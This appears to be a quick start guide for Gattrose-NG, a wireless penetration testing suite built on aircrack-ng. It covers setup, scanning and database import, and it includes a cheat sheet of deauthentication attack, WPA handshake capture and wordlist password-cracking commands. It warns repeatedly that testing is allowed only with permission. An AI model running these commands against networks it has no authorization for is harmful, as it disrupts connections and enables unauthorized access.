# Gattrose-NG Quick Start Guide

## First Launch

### 1. Run Gattrose

```bash
cd /path/to/gattrose-ng
python3 gattrose-ng.py
```

### 2. First Run Setup

On first run, Gattrose will automatically:
- Create virtual environment in `.venv/`
- Install Python dependencies (PyQt6, SQLAlchemy, etc.)
- Check for required system tools
- Launch prerequisite installer if tools are missing

**Expected output:**
```
============================================================
  Gattrose v1.0.0
  Wireless Penetration Testing Suite
============================================================

[*] Project root: /path/to/gattrose-ng
[*] Mode: Portable
[*] Virtual environment: /path/to/gattrose-ng/.venv

[!] Virtual environment not found
[*] Creating virtual environment at /path/to/gattrose-ng/.venv
[+] Virtual environment created successfully
[*] Installing Python dependencies...
[+] Dependencies installed successfully
[*] Launching Gattrose...
```

### 3. Install Missing Prerequisites

If the prerequisite installer appears:

1. Review the **Required** tab - these must be installed
2. Click **Install Required Tools**
3. Enter your sudo password when prompted
4. Wait for installation (may take several minutes)
5. Click **Continue to Gattrose** when ready

**Required tools:**
- aircrack-ng (wireless auditing suite)
- iw / iwconfig (wireless configuration)
- sqlite3 (database)
- tcpdump (packet capture)

**Optional but recommended:**
- reaver (WPS attacks)
- hashcat (password cracking)
- macchanger (MAC spoofing)

## Basic Wireless Scan

### Step-by-Step

**1. Check Wireless Interfaces**

From the Dashboard, check detected interfaces:
- Look for your wireless adapter (e.g., wlan0)
- Verify it's detected by the system

**2. Enable Monitor Mode**

Monitor mode is required for scanning:
```
Dashboard → Enable Monitor Mode button
```

Or manually via terminal:
```bash
sudo airmon-ng start wlan0
```

**3. Start Scanning**

```
Dashboard → Start Network Scan
```

Or navigate to Scanner tab for advanced options.

**4. View Results**

- Results appear in real-time
- All networks saved to database automatically
- View in Database tab for detailed analysis

**5. Stop Scanning**

```
Scanner → Stop Scan
```

**6. Disable Monitor Mode** (when done)

```
Tools → Disable Monitor Mode
```

Or manually:
```bash
sudo airmon-ng stop wlan0mon
```

## WiGLE Database Import

### Get WiGLE Data

1. Go to https://wigle.net
2. Create free account
3. Search for networks in your area
4. Export results as CSV

### Import to Gattrose

1. Open Gattrose
2. Navigate to **Database** tab
3. Click **Import WiGLE Data**
4. Select downloaded CSV file
5. Wait for import (may take time for large files)
6. View imported networks in database

## Database Viewer

### Search Networks

**By SSID:**
```
Database → Search → Enter SSID → Search
```

**By Encryption:**
```
Database → Filter → Encryption → Select type
```

**By Location:**
```
Database → Map View → Select area
```

### Export Data

**Export all networks:**
```
Database → Export → Choose format (CSV, JSON, KML)
```

**Export filtered results:**
```
Database → Apply filters → Export Selection
```

## Handshake Capture (Advanced)

**⚠️ Only on networks you own or have permission to test!**

### Method 1: GUI

1. Scan for networks first
2. Database tab → Select target network
3. Tools tab → Capture Handshake
4. Select your monitor interface
5. Click Start
6. Optional: Click "Send Deauth" to force handshake
7. Wait for handshake capture
8. Handshake saved to database

### Method 2: Manual

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Start capture on specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# In another terminal, send deauth packets
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Wait for "WPA handshake" message in airodump-ng
# Then stop with Ctrl+C
```

## Command-Line Cheat Sheet

### Interface Management

```bash
# List wireless interfaces
airmon-ng

# Enable monitor mode
sudo airmon-ng start wlan0

# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Change channel
sudo iwconfig wlan0mon channel 6

# Change MAC address
sudo macchanger -r wlan0
```

### Scanning

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Save results to file
sudo airodump-ng -c 6 -w output wlan0mon
```

### Handshake Capture

```bash
# Target specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (in another terminal)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Password Cracking

```bash
# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# With specific BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

## Troubleshooting

### "No wireless interfaces found"

**Cause:** Wireless adapter not detected or no drivers

**Solution:**
```bash
# Check if adapter is detected
lsusb  # For USB adapters
iwconfig

# Check drivers
dmesg | grep -i wireless
```

### "Monitor mode failed"

**Cause:** Interfering processes or driver issues

**Solution:**
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Try manually
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up
```

### "Permission denied" errors

**Cause:** Insufficient privileges

**Solution:**
```bash
# Run with sudo
sudo python3 gattrose-ng.py

# Or add user to netdev group
sudo usermod -aG netdev $USER
# Log out and back in
```

### "Database locked" error

**Cause:** Another Gattrose instance or database access

**Solution:**
```bash
# Close other Gattrose instances
# Or remove lock file
rm data/gattrose.db-journal
```

### Qt6 import errors

**Cause:** PyQt6 not installed in venv

**Solution:**
```bash
# Activate venv and reinstall
source .venv/bin/activate
pip install --force-reinstall PyQt6
```

## Tips & Best Practices

### 1. Always Use Monitor Mode

Most features require monitor mode. Enable it before scanning.

### 2. Channel Hopping

For comprehensive scans, let Gattrose hop through all channels automatically.

### 3. Regular Database Backups

```
Settings → Database → Backup Database
```

### 4. MAC Address Randomization

For privacy, change your MAC before scanning:
```
Tools → Change MAC Address → Random
```

### 5. Save Scan Sessions

Name your scans in the Scanner tab for better organization.

### 6. WiGLE Integration

Import WiGLE data to enrich your database with historical network information.

### 7. Use Strong Wordlists

For password cracking, use comprehensive wordlists:
- `/usr/share/wordlists/rockyou.txt` (default)
- Custom wordlists for targeted attacks
- Combine multiple wordlists

### 8. Legal Compliance

**CRITICAL:** Only test networks you own or have explicit written permission to test. Unauthorized access is illegal.

## Next Steps

1. **Explore the GUI** - Familiarize yourself with all tabs
2. **Run Test Scan** - Scan your own network
3. **Review Database** - See what data is collected
4. **Read Full Manual** - Check README.md for advanced features
5. **Customize Settings** - Configure to your preferences

## Getting Help

- **Documentation:** See README.md
- **Logs:** Check `logs/gattrose.log` for errors
- **Issues:** Report bugs on project issue tracker
- **Community:** Join security research communities

---

**Remember:** Gattrose is for authorized security testing only.
Use responsibly and legally.

All times displayed in 24-hour format.
